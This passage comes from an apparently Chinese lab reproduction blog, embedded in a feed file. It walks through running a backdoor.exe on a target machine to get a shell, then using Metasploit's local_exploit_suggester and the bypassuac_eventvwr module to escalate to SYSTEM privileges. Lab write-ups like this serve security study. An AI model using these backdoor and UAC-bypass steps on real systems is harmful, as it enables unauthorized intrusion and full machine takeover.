-<p>靶机执行<code>backdoor.exe</code></p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">c:\back>backdoor.exe
-backdoor.exe
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214355334.png" alt="image-20210506214355334"></p>
-<blockquote>
-<p>得到shell</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214422916.png" alt="image-20210506214422916"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><blockquote>
-<p>使用msf中<code>post/multi/recon/local_exploit_suggester</code>模块查看可利用的提权模块</p>
-</blockquote>
-<pre class=" language-shell"><code class="language-shell">msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester 
-msf6 post(multi/recon/local_exploit_suggester) > set session 1
-session => 1
-msf6 post(multi/recon/local_exploit_suggester) > exploit
-</code></pre>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214605716.png" alt="image-20210506214605716"></p>
-<blockquote>
-<p>使用<code>exploit/windows/local/bypassuac_eventvwr</code>模块进行提权</p>
-</blockquote>
-<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210506214731844.png" alt="image-20210506214731844"></p>
-<p><strong>得到system权限，提权成功</strong></p>
-]]></content>
-      <tags>
-        <tag>复现</tag>
-        <tag>提权</tag>
       </tags>
   </entry>
   <entry>
